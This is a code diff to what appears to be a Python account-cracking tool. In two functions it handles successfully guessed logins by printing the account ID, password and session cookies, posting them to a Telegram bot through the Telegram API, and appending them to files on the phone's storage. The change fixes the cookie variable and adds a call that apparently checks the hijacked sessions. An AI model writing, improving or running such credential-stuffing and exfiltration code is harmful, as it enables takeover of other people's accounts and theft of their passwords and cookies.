@@ -1103,7 +1103,8 @@ def m1(ids,pwv):
                 if 'LIVE' in bithi:
                      print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                      print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
-                     statusok = (f" {cid} | {pas} | {coki} ")
+                     statusok = (f" {cid} | {pas} | {kuki} ")
+                     cek_apk(kuki)
                      requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                      open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                      oks.append(cid)
@@ -1181,7 +1182,8 @@ def m2(ids,pwv):
                 if 'LIVE' in bithi:
                      print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                      print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
-                     statusok = (f" {cid} | {pas} | {coki} ")
+                     cek_apk(kuki)
+                     statusok = (f" {cid} | {pas} | {kuki} ")
                      requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                      open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                      oks.append(cid)
